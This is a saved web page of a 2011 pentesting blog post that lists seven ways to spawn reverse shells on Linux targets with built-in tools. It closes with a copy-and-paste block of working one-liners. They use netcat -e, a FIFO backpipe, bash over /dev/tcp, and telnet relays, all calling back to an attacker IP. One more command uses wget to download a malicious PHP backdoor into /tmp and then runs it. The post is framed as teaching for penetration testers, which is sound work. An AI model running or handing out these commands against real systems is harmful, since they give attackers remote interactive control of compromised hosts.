<!DOCTYPE html>
<!-- saved from url=(0071)http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">

    <title>7 Linux Shells Using Built-in Tools</title>
    
    <meta name="author" content="Tim Tomes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script async="" src="./7 Linux Shells Using Built-in Tools_files/"></script><script src="./7 Linux Shells Using Built-in Tools_files/jquery-1.10.2.min.js" type="text/javascript"></script><style type="text/css"></style>
    <script src="./7 Linux Shells Using Built-in Tools_files/bootstrap.min.js" type="text/javascript"></script>
    <link href="./7 Linux Shells Using Built-in Tools_files/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="./7 Linux Shells Using Built-in Tools_files/style.css" rel="stylesheet" type="text/css" media="screen" charset="utf-8">
    <link rel="shortcut icon" href="http://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e?s=16">
  
    <!--[if lt IE 9]>
      <script src="/assets/themes/bootstrap/resources/respond/Respond.min.js"></script>
    <![endif]-->

    <link href="http://www.lanmaster53.com/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="http://www.lanmaster53.com/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  <script type="text/javascript" charset="utf-8" async="" src="./7 Linux Shells Using Built-in Tools_files/"></script><link rel="stylesheet" type="text/css" href="chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/skin/socialwidgets.css"></head>

  <body>
    <div class="container">
      <nav class="navbar navbar-default" role="navigation">
        <div>
          <ul class="meta">
            <li><a href="http://www.lanmaster53.com/"><img src="./7 Linux Shells Using Built-in Tools_files/0a6d9b1ad59ad436bf9d9d16b2a7133e.png" class="avatar"></a></li>
            <li><a href="https://bitbucket.org/lanmaster53" target="_blank"><img src="./7 Linux Shells Using Built-in Tools_files/bitbucket.png"></a></li>
            <li><a href="https://github.com/lanmaster53" target="_blank"><img src="./7 Linux Shells Using Built-in Tools_files/github.png"></a></li>
            <li><a href="https://twitter.com/lanmaster53" target="_blank"><img src="./7 Linux Shells Using Built-in Tools_files/" style="display: none !important;"></a></li>
            <li><a href="https://www.linkedin.com/in/lanmaster53" target="_blank"><img src="./7 Linux Shells Using Built-in Tools_files/" style="display: none !important;"></a></li>
            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="./7 Linux Shells Using Built-in Tools_files/" style="display: none !important;"></a></li>
            <li><a href="http://www.lanmaster53.com/contact/"><img src="./7 Linux Shells Using Built-in Tools_files/email.png"></a></li>
            <li><a href="http://www.lanmaster53.com/atom.xml"><img src="./7 Linux Shells Using Built-in Tools_files/rss.png"></a></li>
          </ul>
        </div>
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <!--a class="navbar-brand" href="/">lanmaster53.com</a-->
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse"><!-- navbar-ex1-collapse class designation required for button linkage -->
          <ul class="nav navbar-nav">
            
            
            


  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/projects/">Projects</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/training/">Training</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/services/">Services</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/archive/">Archive</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/categories/">Categories</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/about/">About</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="http://www.lanmaster53.com/contact/">Contact</a></li>
      	
      
    
  



          </ul>
        </div>
      </nav>
      <div class="page-header">
        <h1><a href="http://www.lanmaster53.com/">lanmaster53.com</a></h1>
         <h4>a hacker looking out for users by educating...</h4>
      </div>
      <div class="row">
        <div class="col-xs-12">
            
            <h2>7 Linux Shells Using Built-in Tools </h2>
            <h4><span>Friday, May 27, 2011</span></h4>

            <div>
              <p>There are many distributions of linux, and they all do things a little different regarding default security and built-in tool sets. Which means when engaging these different flavors during a pentest, what works against one linux target to get an interactive shell, may not work against another. Well, not to worry my friends, there are many techniques for spawning shells, specifically reverse shells, from linux, and one or more of these techniques is bound to be available no matter which distro you’re looking at.</p>

<p>The scenario is this: You have the ability to run a simple command, or cause a user to run a simple command, on the target system. Whether it be via a Remote Command Execution vulnerability in a website, or some sort of php injected XSS which causes a privileged user to run commands on the target system. There are many instances of this scenario. Starting from the easiest and most common, here are some of the techniques which can be used to gain reverse shell on the target system.</p>

<h3 id="netcat">#1. netcat</h3>

<p>Surprise!!! Nothing new here. Plain and simple. Fire up a listener on the attacker machine on a port which is reachable from the target and connect back to the listener with netcat. Looks like this.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/netcat.jpg" alt=""></p>

<p>…just kidding…</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_nc_shell.png" alt=""></p>

<h3 id="netcat-with-gapingsecurityhole-disabled">#2. netcat with GAPING_SECURITY_HOLE disabled:</h3>

<p>This is a little trick that <a href="https://twitter.com/#!/edskoudis">Ed Skoudis</a> tweeted about in November of last year, but I haven’t seen it widely publicized. It is based on the common technique used to build netcat relays. When the <code class="highlighter-rouge">GAPING_SECURITY_HOLE</code> is disabled, which means you don’t have access to the ‘-e’ option of netcat, most people pass on using netcat and move to something else. Well this just isn’t necessary. Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_nc_gsh_shell.png" alt=""></p>

<h3 id="netcat-without-netcat">#3. netcat without netcat:</h3>

<p>I love “hacks” that use features of the operating system against itself. This is one of those “hacks”. It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It’s not always available, but can be quite handy when it is.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_nc_wo_nc.png" alt=""></p>

<h3 id="netcat-without-netcat-or-devtcp">#4. netcat without netcat or /dev/tcp:</h3>

<p>/dev/tcp not available either? Just use telnet with technique #2.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_nc_telnet.png" alt=""></p>

<h3 id="telnet-to-telnet">#5. telnet-to-telnet:</h3>

<p>I’m not sure why you’d use this technique, but it’s an option, so here it is nonetheless. This is clearly the ugliest of the techniques. This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_tel2tel.png" alt=""></p>

<h3 id="rce-shell">#6. RCE shell:</h3>

<p>On this one I’m cheating a little bit. This applies to Remote Command Execution vulnerabilities only. Rather than manually enter commands into a proxy or browser url, I wrote small python script which gives you the feel of a shell, without spawning anything in reverse from the target. You merely pass the script the vulnerable url with the injectable field replaced with the ‘&lt;rce&gt;’ tag and it presents you with a clean interface for entering commands. In the background, the script is making the request to the web server, parsing the response, and presenting it to you.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_rce.png" alt=""></p>

<h3 id="php-reverse-shell-via-interactive-console">#7. PHP reverse shell via interactive console:</h3>

<p>The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory (because it is typically world writable), uses wget to download a malicious php reverse_tcp backdoor (which the attacker hosts on a web server that he controls), and executes the backdoor via the interactive console.</p>

<p><img src="./7 Linux Shells Using Built-in Tools_files/sh_php.png" alt=""></p>

<p>I want to end this post by stating that I am not the originator of techniques #1, 2, 3, 5, or 7. The majority of these techniques were learned in Ed Skoudis’ amazing Security 504 and 560 classes available through SANS. Technique #4 is something I’ve never seen but stumbled across as I was conducting the demos for this post, so I’ll take credit. Obviously, anyone can do #6, and there are plugins for various automated web app testing software packages that do, but I built my script from the ground up and tailored it to preference. If you know of any additional methods that may be helpful to the pentesting community, please leave in the comments below. Without sharing, we all fail. Thanks, and enjoy!</p>

<p>For copy and paste:</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#1</span>
nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash
<span class="c">#2</span>
mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe
<span class="c">#3</span>
/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1
<span class="c">#4</span>
mknod backpipe p; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe
<span class="c">#5</span>
telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;
<span class="c">#7</span>
wget -O /tmp/bd.php &lt;url_to_malicious_file&gt; <span class="o">&amp;&amp;</span> php -f /tmp/bd.php
</code></pre>
</div>

            </div>

            <p>Like what you see? Join me for live training! See the <a href="http://www.lanmaster53.com/training/">Training</a> page for more information.</p>

            
              <ul class="tag_box inline">
                
                


  
     
    	<li><a href="http://www.lanmaster53.com/categories/#network security-ref">
    		network security <span>9</span>
    	</a></li>
    
  


              </ul>
            

            

            <ul class="pagination">
              
                <li class="prev"><a href="http://www.lanmaster53.com/2011/05/stealth-cookie-stealing-new-xss-technique/" title="Stealth Cookie Stealing (XSS technique)">← Previous</a></li>
              
                <li><a href="http://www.lanmaster53.com/archive/">Archive</a></li>
              
                <li class="next"><a href="http://www.lanmaster53.com/2012/12/defending-against-ssl-stripping-attacks/" title="Defending Against SSL Stripping Attacks">Next →</a></li>
              
            </ul>
            <hr>

    <div>
      <h4>Please share your thoughts, comments, and suggestions via Twitter.</h4>
      <img src="chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/skin/socialwidgets/Twitter.svg" class="privacyBadgerReplacementButton" title="PrivacyBadger has replaced this Twitter button.">
      <a href="http://twitter.com/lanmaster53" class="twitter-follow-button twitter-follow-button-error" data-show-count="false" data-twitter-extracted-i1458036320930675930="true">Follow @lanmaster53</a>
      <script src="./7 Linux Shells Using Built-in Tools_files/widgets.js" type="text/javascript"></script>
    </div>

        </div>
      </div>
      <hr>
      <footer>
        <p>
          © 2016 Tim Tomes
          <span class="pull-right text-muted">
            powered by
            <a href="https://github.com/dbtek/jekyll-bootstrap-3" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll-Bootstrap-3</a>
            and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>
          </span>
        </p>
      </footer>
    </div>
    


  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-52269615-1', 'lanmaster53.com');
  ga('send', 'pageview');

</script>





  


<iframe id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;"></iframe></body></html>